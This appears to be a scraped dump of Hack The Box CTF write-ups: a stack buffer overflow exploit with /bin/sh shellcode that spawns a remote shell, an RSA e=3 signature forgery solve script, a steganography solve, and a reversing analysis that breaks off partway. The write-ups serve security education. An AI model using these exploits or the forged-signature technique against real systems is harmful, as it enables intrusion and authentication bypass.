amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments  Reverse engineering If we use Ghidra, we will see the decompiled source code in C for the main function:\nintmain() { intres; intoption; charpassword[16]; charcommand[76]; setup(); while(true) { while(true) { memset(password, 0, 16); printf(\"Welcome to your BatComputer, Batman. What would you like to do?\\n1. Track Joker\\n2. Cha se Joker\\n\u0026gt; \"); __isoc99_scanf(\"%d\", \u0026amp;option); if(option !=1) break; printf(\"It was very hard, but Alfred managed to locate him: %p\\n\", command); } if(option !=2) break; printf(\"Ok. Let\\'s do this. Enter the password: \"); __isoc99_scanf(\"%15s\", password); res =strcmp(password, \"b4tp@$$w0rd!\"); if(res !=0) { puts(\"The password is wrong.\\nI can\\'t give you access to the BatMobile!\"); /* WARNING: Subroutine does not return */ exit(0); } printf(\"Access Granted. \\nEnter the navigation commands: \"); read(0, command, 137); puts(\"Roger that!\"); } puts(\"Too bad, now who\\'s gonna save Gotham? Alfred?\"); return0; }  We have two options:\n The first one outputs a memory address for the variable command:  $ ./batcomputer Welcome to your BatComputer, Batman. What would you like to do? 1. Track Joker 2. Chase Joker \u0026gt; 1 It was very hard, but Alfred managed to locate him: 0x7ffc8e4e96c4   And the second one requires a password:  Welcome to your BatComputer, Batman. What would you like to do? 1. Track Joker 2. Chase Joker \u0026gt; 2 Ok. Let's do this. Enter the password: asdf The password is wrong. I can't give you access to the BatMobile!  The password is hard-coded in the binary (b4tp@$$w0rd!):\n$ ./batcomputer Welcome to your BatComputer, Batman. What would you like to do? 1. Track Joker 2. Chase Joker \u0026gt; 2 Ok. Let's do this. Enter the password: b4tp@$$w0rd! Access Granted. Enter the navigation commands: asdf Roger that!  Buffer Overflow vulnerability We can see in the code above that command is a character array of 76 bytes, but we are allowed to enter up to 137 bytes. This leads to a Buffer Overflow vulnerability. It can also be tested dynamically:\n$ ./batcomputer Welcome to your BatComputer, Batman. What would you like to do? 1. Track Joker 2. Chase Joker \u0026gt; 2 Ok. Let's do this. Enter the password: b4tp@$$w0rd! Access Granted. Enter the navigation commands: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Roger that! Welcome to your BatComputer, Batman. What would you like to do? 1. Track Joker 2. Chase Joker \u0026gt; 3 Too bad, now who's gonna save Gotham? Alfred? zsh: segmentation fault (core dumped) ./batcomputer  Notice that we entered a lot of junk characters and exited the while loop using an invalid option (3). When the program wants to return from main, the saved return address which was on the stack now is overwritten with 0x4141414141414141 (our junk data). Since it is not a valid memory address, the program just crashes (segmentation fault).\nBuffer Overflow exploitation First of all, we would like to control the program execution. That is, we want to control the value of the saved return address. For that, we can use GDB:\n$ gdb -q batcomputer Reading symbols from batcomputer... (No debugging symbols found in batcomputer) gef➤ pattern create 136 [+] Generating a pattern of 136 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaa [+] Saved as '$_gef0' gef➤ run Starting program: ./batcomputer Welcome to your BatComputer, Batman. What would you like to do? 1. Track Joker 2. Chase Joker \u0026gt; 2 Ok. Let's do this. Enter the password: b4tp@$$w0rd! Access Granted. Enter the navigation commands: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaa aqaaaaaaa Roger that! Welcome to your BatComputer, Batman. What would you like to do? 1. Track Joker 2. Chase Joker \u0026gt; 3 Too bad, now who's gonna save Gotham? Alfred? Program received signal SIGSEGV, Segmentation fault. 0x000055555555531f in ?? ()  gef➤ pattern offset $rsp [+] Searching for '$rsp' [+] Found at offset 84 (little-endian search) likely [+] Found at offset 85 (big-endian search)  And there we obtain that the offset is 84, so we need exactly 84 bytes to reach the position of the return address that is saved on the stack.\nSince NX is disabled, we can enter shellcode on the stack and run it. To do this, we can take advantage of the memory leak from the first option (the address of command) and overwrite the return address with this address. Then, instead of junk bytes, we can enter shellcode to pop a shell.\nFor instance, we can use msfvenom:\n$ msfvenom -p linux/x64/exec -f py [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 21 bytes Final size of py file: 117 bytes buf = b\"\" buf += b\"\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x99\\x50\" buf += b\"\\x54\\x5f\\x52\\x5e\\x6a\\x3b\\x58\\x0f\\x05\"  This shellcode is very short (only 21 bytes), so we will need to add some padding to reach 84 bytes (there\u0026rsquo;s no need for using nop instructions since we know the exact address where we are storing our shellcode).\nFinal exploit This is the exploit:\ndefmain(): p=get_process() p.sendlineafter(b'\u0026gt; ', b'1') p.recvuntil(b'It was very hard, but Alfred managed to locate him: ') command_addr=int(p.recvline().decode(), 16) offset=84 shellcode=b'\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x99\\x50\\x54\\x5f\\x52\\x5e\\x6a\\x3b\\x58\\x0f\\x05' payload=shellcode payload+=b'A'*(offset-len(payload)) payload+=p64(command_addr) p.sendlineafter(b'\u0026gt; ', b'2') p.sendlineafter(b\"Ok. Let's do this. Enter the password: \", b'b4tp@$$w0rd!') p.sendlineafter(b'Enter the navigation commands: ', payload) p.sendlineafter(b'\u0026gt; ', b'3') p.recv() p.interactive()  If we run it locally, we have a shell:\n$ python3 solve.py [*] './batcomputer' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments [+] Starting local process './batcomputer': pid 3187554 [*] Switching to interactive mode $ ls batcomputer solve.py $ [*] Interrupted [*] Stopped process './batcomputer' (pid 3187554)  Flag Let\u0026rsquo;s try remotely:\n$ python3 solve.py 178.62.79.95:30907 [*] './batcomputer' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments [+] Opening connection to 178.62.79.95 on port 30907: Done [*] Switching to interactive mode $ ls batcomputer flag.txt $ cat flag.txt HTB{l0v3_y0uR_sh3llf_U_s4v3d_th3_w0rld!}  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/pwn/bat-computer/","section":"ctf","summary":"64-bit binary. Buffer Overflow. Shellcode","time":5,"title":"Bat Computer"},{"contents":"We are given a Python source code that asks for a signature. This is the main function:\ndefmain(s): rsa=RSA(2048) user, data=parseEmail() signature=rsa.sign(user) rsa.verify(user, signature) headers=generateHeaders(rsa, signature) valid_email=headers+data sendMessage(s, valid_email+\"\\n\\n\") try: forged_signature=recieveMessage(s, \"Enter the signature as hex: \") forged_signature=bytes.fromhex(forged_signature) ifnotrsa.verify(user, forged_signature): sendMessage(s, \"Invalid signature\") ifdifferent(rsa, signature, forged_signature): sendMessage(s, FLAG) except: sendMessage(s, \"An error occured\")  The function rsa.verify will do this:\ndefverify(self, message, signature): keylength=len(long_to_bytes(self.n)) decrypted=self.encrypt(signature) clearsig=decrypted.to_bytes(keylength, \"big\") r=re.compile(b'\\x00\\x01\\xff+?\\x00(.{15})(.{20})', re.DOTALL) m=r.match(clearsig) ifnotm: raiseVerificationError('Verification failed') ifm.group(1) !=self.asn1: raiseVerificationError('Verification failed') ifm.group(2) !=sha1(message).digest(): raiseVerificationError('Verification failed')  It runs self.encrypt, which will be $s ^ e \\pmod{n}$, where $s$ is the signature, $e$ is the public exponent and $n$ is the public modulus.\nWe have $n$ and $e$ because the server sends these values in a PEM format:\n$ nc 127.0.0.1 1337 signature: 6d0367ad7e069a4eef22535a8fa5df13e9701b31c94d30db5905e7923535835463b8673ed13fe3b6eefcfdd6074d76bbb9ec95022f56049137282aa8ab01b25956884b18116d052fc16aed4af66bfda92ca64575f46c03fbc322de10fb8518edfe3d09020b3c109e438108edcdc7fbb33d34b6f4da745c0cec157b06ad7939e66edf89c6681aef841574dfccd98a803ba583e488b528df1501e717edcf4047ee8f2bc18556c1f41f89385fe68ef7af2ee2e132f7042e9aed724cc6659310db8153756d16f9da99662ac7d5abb8e00d64735ac544f8f57d5519e3edae3824db913aa67d8bfc64afbeb1787f56c455ffb1198fb2da5b40ea67cd0d810e8015ac4b certificate: -----BEGIN PUBLIC KEY----- MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAnxwOqoIroFTNdDdVS13C I8wDj4H/3bI8T6wSMaL5GE4GLjgz33szj+u1XPxUb0vfdMxkfcTsvtYP9oZtPX3L FMsi8KnrpvlqTzPNbKDO6Ga1viO3C6GPKIJwDyXzWI2IxnSrDHjty30dbKl1lO9E XXWMj7GXFFVOBDnPfxWFwyMUnJc/oooyDF2vVpwvmIWFTfxRLMrmJpeHlA9Vg94A Ype/CkbURdckwFJt0Yvp0wFFRrVhsQeFlIrq0GQtSif8YlIAjyANTAqNDoKS0fq5 Fc3388Gt2D04JNcny7qjmxWuPcnn+2PZaog10K4YrjK8ZVtptwl97f06CuktB14C jQIBAw== -----END PUBLIC KEY----- From: IT Department \u0026lt;it@cloudcompany.com\u0026gt; To: j.smith@sheesh.gov.edu Subject: Confirm your identity Hello there, You have recently changed the password for your CloudCompany account. Please verify your account using the link below to confirm your identity: https://ccloud.cloudcompany.co/confirm-identity/5912031940529412 Below are some common reasons for unwanted or irregular activity: - Unauthorized or unexpected resource activity - An unpatched CloudCompany Elastic Compute Cloud (CCEC2) instance could be infected and become a botnet agent. - Exposed credentials or access keys. - Unintentional misuse - An end user of a service provided by an CloudCompany customer might post malware files to a public S1 bucket. - False complaints - Sometimes Internet users falsely report legitimate activities as misuse. Thank you for your patience while we work on this case. We appreciate your feedback. Please share your experience by rating this correspondence using the CloudCompany Support Center link at the bottom of this correspondence. Each correspondence can also be rated by selecting the stars in the upper right corner of each correspondence in the CloudCompany Support Center. Best regards, CloudCompany \u0026lt;img width=396 height=129 id=\"1\" src=\"cid:Logo.jpg\"\u0026gt; Enter the signature as hex:  Moreover, once the signature is decrypted, the server uses a Regular Expression to parse the decrypted bytes.\nUsing the following Python sentence, we can see what is the payload that is being signed:\nprint(f'{clearsig= }')  $ python3 server.py clearsig = b'\\x00\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x000!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p'  Notice that the Regular Expression does not check the number of bytes \u0026quot;\\xff\u0026quot;, but it checks that the decrypted string starts with \u0026quot;\\x00\\x01\\xff\u0026quot; and its length is 256 bytes. Hence, we can pass the Regular Expression check setting less bytes \u0026quot;\\xff\u0026quot; and padding the string by the end. For example:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; clearsig = b'\\x00\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x000!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p' \u0026gt;\u0026gt;\u0026gt; clearsig.count(b'\\xff') 218 \u0026gt;\u0026gt;\u0026gt; len(clearsig) 256 \u0026gt;\u0026gt;\u0026gt; import re \u0026gt;\u0026gt;\u0026gt; r = re.compile(b'\\x00\\x01\\xff+?\\x00(.{15})(.{20})', re.DOTALL) \u0026gt;\u0026gt;\u0026gt; m = r.match( b'\\x00\\x01' + b'\\xff' * 218 + b'\\x000!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p') \u0026gt;\u0026gt;\u0026gt; m.groups() (b'0!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14', b'\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p') \u0026gt;\u0026gt;\u0026gt; m = r.match((b'\\x00\\x01' + b'\\xff' * 1 + b'\\x000!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p').ljust(256, b'\\0')) \u0026gt;\u0026gt;\u0026gt; m.groups() (b'0!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14', b'\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p')  We only need to find a number $t$ so that $t ^ 3$ (remember that $e = 3$) passes the Regular Expression check.\nSo using this code we can obtain such value $t$:\nforged_min=int((b'\\x00\\x01'+b'\\xff'*1+b'\\x000!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p').ljust(256, b'\\x00').hex(), 16) forged_max=int((b'\\x00\\x01'+b'\\xff'*217+b'\\x000!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p').ljust(256, b'\\xff').hex(), 16) perfect_cube_range=range(iroot(forged_min, e)[0], iroot(forged_max, e)[0]) regex=re.compile(b'\\x00\\x01\\xff+?\\x00(.{15})(.{20})', re.DOTALL) keylength=len(long_to_bytes(n)) fortinperfect_cube_range: clearsig=(t**e).to_bytes(keylength, 'big') m=regex.match(clearsig) ifmandm.groups() ==(b'0!0\\t\\x06\\x05+\\x0e\\x03\\x02\\x1a\\x05\\x00\\x04\\x14', b'\\xdb}\\xdd?yeA\\xdaO\\x80]yHo\\xd3w\\x07\\x9c2p'): break r.sendafter(b'Enter the signature as hex: ', hex(t)[2:].encode()) log.success(f'Flag: {r.recv().decode()}') r.close()  Using this solution script: solve.py we can obtain the flag:\n$ python3 solve.py 178.62.23.240:30323 [+] Opening connection to 178.62.23.240 on port 30323: Done [+] Flag: HTB{4_8131ch3n84ch32_254_vu1n} [*] Closed connection to 178.62.23.240 port 30323  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/bbgun06/","section":"ctf","summary":"RSA. Forge signature. Regular Expression bypass","time":3,"title":"BBGun06"},{"contents":"We are given two PNG images called intercepted.png and original.png:\n$ file intercepted.png intercepted.png: PNG image data, 775 x 550, 8-bit/color RGB, non-interlaced $ file original.png original.png: PNG image data, 775 x 550, 8-bit/color RGB, non-interlaced  Both images look the same visually:\nBut they are different because their MD5 hashes do not coincide:\n$ md5sum intercepted.png 88e9b5b97e4a615f1aa26d11dbcdec0d intercepted.png $ md5sum original.png 04e2562c19e680b6493b2a31d65c51e3 original.png  Hence, we might think that there is some kind of steganography being used on intercepted.png. Since it is a PNG image, we can think of zsteg, but it does not seem useful for the moment.\nSince PNG images do not lose any data when compressed, we can operate both images at pixel level (for example, XOR or substraction). In order to get the differences between both files, we can use this short Python code (solve.py):\n#!/usr/bin/env python3 importnumpyasnp fromPILimportImage defmain(): intercepted=np.array(Image.open('intercepted.png')) original=np.array(Image.open('original.png')) result=np.subtract(intercepted, original) Image.fromarray(result).save('result.png') if__name__=='__main__': main()  If we wanted to use XOR, the method for that is bitwise_xor instead of substract. The resulting image (result.png) seems to be completely black. But we can tweak the colors to see some strange pixels at the left:\nIf we zoom in, we can appreciate them better:\nAt this point, if we use zsteg on the result.png image, we will get a text message:\n$ python3 solve.py $ zsteg -a result.png b1,b,lsb,yx .. text: \"SFRCezFmX2FfdzAwZF9jaHVja19jMHVsZF9jaHVja193MDBkfQ==\" b2,rgb,msb,yx .. file: Applesoft BASIC program data, first line number 128 b2,bgr,msb,yx .. file: Targa image data - RLE 128 x 8 x 32 +32768 +32 \"�\" b4,b,lsb,yx .. file: PDP-11 UNIX/RT ldp b4,bgr,lsb,yx .. file: dBase IV DBT, block length 4096, next free block index 256, next free block 0, next used block 0 b5,rgb,lsb,yx .. file: X11 SNF font data, MSB first b6,rgb,lsb,yx .. file: GLS_BINARY_LSB_FIRST b6,bgr,lsb,yx .. file: Targa image data - Map 65536 x 64 x 16 b7,b,lsb,yx .. file: TTComp archive data, binary, 1K dictionary b7,rgb,msb,yx .. file: Matlab v4 mat-file (little endian) �, numeric, rows 512, columns 524288 b8,rgb,msb,yx .. file: Matlab v4 mat-file (little endian) , numeric, rows 32768, columns 2147483648 b1,rgb,msb,yx,prime .. file: Applesoft BASIC program data, first line number 146 b2,rgb,msb,yx,prime .. file: Applesoft BASIC program data, first line number 128 b4,b,lsb,yx,prime .. file: Targa image data - Map (17-4369) 273 x 4353 x 16 +4097 +256 - 1-bit alpha \"\" b4,rgb,lsb,yx,prime .. file: Targa image data - Map 65536 x 65536 x 16 +1 +272 - 1-bit alpha b5,rgb,lsb,yx,prime .. file: X11 SNF font data, MSB first b6,rgb,lsb,yx,prime .. file: GLS_BINARY_LSB_FIRST b6,bgr,lsb,yx,prime .. file: Targa image data - Map 65536 x 64 x 16 +256 b7,b,lsb,yx,prime .. file: TTComp archive data, binary, 1K dictionary b7,rgb,msb,yx,prime .. file: Matlab v4 mat-file (little endian) �, numeric, rows 512, columns 524288, imaginary b8,rgb,msb,yx,prime .. file: Matlab v4 mat-file (little endian) �, numeric, rows 32768, columns 2147483648 b1,b,lsb,Yx .. file: Matlab v4 mat-file (little endian) ���2r2Y�JZq�k9�J�Zr2Y�JZq�k�\tx���0jىz�\t)�(, numeric, rows 0, columns 0 b1,b,msb,Yx .. file: Matlab v4 mat-file (little endian) ٚQ�LNL��R�Z��֜R�ZNL��R�Z���]���� V��^ِ��, numeric, rows 0, columns 0  And we get a string that seems to be encoded in Base64. And there\u0026rsquo;s the flag:\n$ echo SFRCezFmX2FfdzAwZF9jaHVja19jMHVsZF9jaHVja193MDBkfQ== | base64 -d HTB{1f_a_w00d_chuck_c0uld_chuck_w00d}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/bitsnbytes/","section":"ctf","summary":"Image substraction. Steganography with zsteg","time":3,"title":"BitsNBytes"},{"contents":"We are given a 32-bit binary called vuln:\nArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)  We do not have the source code of the binary, and it is stripped:\n$ file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=836e2f666bd53c2307bff4801d330e444556a006, stripped  Reverse engineering Reversing the binary will be more challenging because we do not have the names of the functions. However, if we open it in Ghidra, we can easily identify the main function (the one called by __libc_start_main, inside a function usually named by Ghidra as entry):\nvoid entry() { __libc_start_main(FUN_0814c22c); do { /* WARNING: Do nothing block with infinite loop */ } while (true); }  Ghidra will name functions with their addresses. We can rename a function right-clicking on its name, so we can refer to FUN_0814c22c as main. This is the function:\nvoid main() { setbuf(stdout,(char *) 0x0); FUN_0811d5b3(); FUN_0811d941(); puts(\"fizz\"); FUN_0811ead2(); puts(\"buzz\"); puts(\"fizz\"); FUN_0811fbb3(); FUN_08120828(); puts(\"fizz\"); puts(\"buzz\"); FUN_08121d33(); puts(\"fizz\"); FUN_08122908(); FUN_08122ea8(); puts(\"fizzbuzz\"); FUN_081237e9(); FUN_081241ca(); puts(\"fizz\"); FUN_081255ef(); puts(\"buzz\"); puts(\"fizz\"); FUN_08127392(); FUN_08127c08(); puts(\"fizz\"); puts(\"buzz\"); FUN_081294b8(); puts(\"fizz\"); FUN_0812a7b4(); FUN_0812b0ae(); puts(\"fizzbuzz\"); FUN_0812c368(); FUN_0812c6f6(); puts(\"fizz\"); FUN_0812d430(); puts(\"buzz\"); puts(\"fizz\"); FUN_0812edb3(); FUN_0812f1b9(); puts(\"fizz\"); puts(\"buzz\"); FUN_081309d7(); puts(\"fizz\"); FUN_08131dba(); FUN_08132072(); puts(\"fizzbuzz\"); FUN_0813282a(); FUN_0813326e(); puts(\"fizz\"); FUN_08133b70(); puts(\"buzz\"); puts(\"fizz\"); FUN_08135115(); FUN_081355d3(); puts(\"fizz\"); puts(\"buzz\"); FUN_08137124(); puts(\"fizz\"); FUN_08137f92(); FUN_08138931(); puts(\"fizzbuzz\"); FUN_0813979b(); FUN_08139ba1(); puts(\"fizz\"); FUN_0813ac2a(); puts(\"buzz\"); puts(\"fizz\"); FUN_0813ca30(); FUN_0813cf2e(); puts(\"fizz\"); puts(\"buzz\"); FUN_0813e2a2(); puts(\"fizz\"); FUN_0813f4d8(); FUN_0813fe56(); puts(\"fizzbuzz\"); FUN_08140c2e(); FUN_081413de(); puts(\"fizz\"); FUN_0814215d(); puts(\"buzz\"); puts(\"fizz\"); FUN_08142af1(); FUN_08143724(); puts(\"fizz\"); puts(\"buzz\"); FUN_081451af(); puts(\"fizz\"); FUN_08145c2a(); FUN_0814668f(); puts(\"fizzbuzz\"); FUN_081470c9(); FUN_08147792(); puts(\"fizz\"); FUN_0814868f(); puts(\"buzz\"); puts(\"fizz\"); FUN_0814a663(); FUN_0814ac03(); puts(\"fizz\"); puts(\"buzz\"); }  Odd function, isn\u0026rsquo;t it? Let\u0026rsquo;s see the first called function (FUN_0811d5b3):\nvoid FUN_0811d5b3() { int iVar1; iVar1 = FUN_080486b1(4); if (iVar1 != 4) { FUN_081451af(); iVar1 = FUN_080486b1(4); if (iVar1 != 4) { FUN_0812d430(); iVar1 = FUN_080486b1(10); if (iVar1 != 10) { FUN_0812d430(); iVar1 = FUN_080486b1(7); if (iVar1 != 7) { FUN_08140c2e(); iVar1 = FUN_080486b1(0x11); if (iVar1 != 0x11) { FUN_0811d5b3(); iVar1 = FUN_080486b1(2); if (iVar1 != 2) { FUN_0813e2a2(); iVar1 = FUN_080486b1(0xe); if (iVar1 != 0xe) { FUN_0813fe56(); iVar1 = FUN_080486b1(6); if (iVar1 != 6) { FUN_08137124(); iVar1 = FUN_080486b1(0xe); if (iVar1 != 0xe) { FUN_08142af1(); iVar1 = FUN_080486b1(2); if (iVar1 != 2) { FUN_08127392(); iVar1 = FUN_080486b1(0xc); if (iVar1 != 0xc) { FUN_0812f1b9(); iVar1 = FUN_080486b1(3); if (iVar1 != 3) { FUN_08146b6b(); iVar1 = FUN_080486b1(0x11); if (iVar1 != 0x11) { FUN_0812edb3(); iVar1 = FUN_080486b1(8); if (iVar1 != 8) { FUN_081309d7(); iVar1 = FUN_080486b1(0x11); if (iVar1 != 0x11) { FUN_08140c2e(); iVar1 = FUN_080486b1(9); if (iVar1 != 9) { FUN_0814ac03(); iVar1 = FUN_080486b1(0x11); if (iVar1 != 0x11) { FUN_0812b0ae(); iVar1 = FUN_080486b1(0x12); if (iVar1 != 0x12) { FUN_0814668f(); iVar1 = FUN_080486b1(0xb); if (iVar1 != 0xb) { FUN_080fc4b8(); iVar1 = FUN_080486b1(0x11); if (iVar1 != 0x11) { FUN_0811ead2(); iVar1 = FUN_080486b1(3); if (iVar1 != 3) { FUN_08142af1(); iVar1 = FUN_080486b1(4); if (iVar1 != 4) { FUN_08120828(); iVar1 = FUN_080486b1(7); if (iVar1 != 7) { FUN_0813ac2a(); iVar1 = FUN_080486b1(7); if (iVar1 != 7) { FUN_08127392(); iVar1 = FUN_080486b1(6); if (iVar1 != 6) { FUN_08138931(); iVar1 = FUN_080486b1(10); if (iVar1 != 10) { FUN_08147792(); iVar1 = FUN_080486b1(0xc); if (iVar1 != 0xc) { FUN_08140c2e(); iVar1 = FUN_080486b1(0xc); if (iVar1 != 0xc) { FUN_0811d941(); iVar1 = FUN_080486b1(3); if (iVar1 != 3) { FUN_0812d430(); iVar1 = FUN_080486b1(2); if (iVar1 != 2) { FUN_0814868f(); } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } }  Even more strange. Anyways, this strange function is calling multiple times to FUN_080486b1, which is a bit nicer:\nuint FUN_080486b1(uint param_1) { int iVar1; uint uVar2; char acStack30[9]; undefined local_15; size_t local_14; uint local_10; local_10 = 1; while (true) { while (true) { while (true) { if (param_1 \u0026lt;= local_10) { return local_10; } printf(\"%zu? \", local_10); __isoc99_scanf(\"%9s\", acStack30 + 1); local_15 = 0; local_14 = strnlen(acStack30 + 1, 8); if (acStack30[local_14] == '\\n') { acStack30[local_14] = '\\0'; } if (local_10 != (local_10 / 0xf) * 0xf) break; iVar1 = strncmp(acStack30 + 1, \"fizzbuzz\", 8); if (iVar1 != 0) { return local_10; } local_10 = local_10 + 1; } if (local_10 % 3 == 0) break; if (local_10 == (local_10 / 5) * 5) { iVar1 = strncmp(acStack30 + 1, \"buzz\", 8); if (iVar1 != 0) { return local_10; } local_10 = local_10 + 1; } else { uVar2 = strtol(acStack30 + 1, (char **) 0x0, 10); if (local_10 != uVar2) { return local_10; } local_10 = local_10 + 1; } } iVar1 = strncmp(acStack30 + 1, \"fizz\", 8); if (iVar1 != 0) break; local_10 = local_10 + 1; } return local_10; }  Finding an interesting function This is an important function, I decided to call it get_some_data. If we analyze it, we can guess what it is doing. For the sake of legibility, I translated it to Python code:\ndef get_some_data(param_1: int) -\u0026gt; int: local_10 = 1 while True: while True: while True: if param_1 \u0026lt;= local_10: return local_10 acStack30 = input(f'{local_10}? ').strip() if local_10 % 15 != 0: break if acStack30 != 'fizzbuzz': return local_10 local_10 += 1 if local_10 % 3 == 0: break if local_10 % 5 != 0: if acStack30 != 'buzz': return local_10 local_10 += 1 elif acStack30 != str(local_10): return local_10 local_10 += 1 if acStack30 != 'fizz': return local_10 local_10 += 1  It is still difficult to read. If we simplify it a bit more, we have this function:\ndef get_some_data(param_1: int) -\u0026gt; int: for local_10 in range(1, param_1): acStack30 = input(f'{local_10}? ').strip() if local_10 % 15 == 0: if acStack30 != 'fizzbuzz': return local_10 elif local_10 % 3 == 0: if acStack30 != 'fizz': return local_10 elif local_10 % 5 == 0: if acStack30 != 'buzz': return local_10 elif acStack30 != str(local_10): return local_10 return param_1  Much better, right? 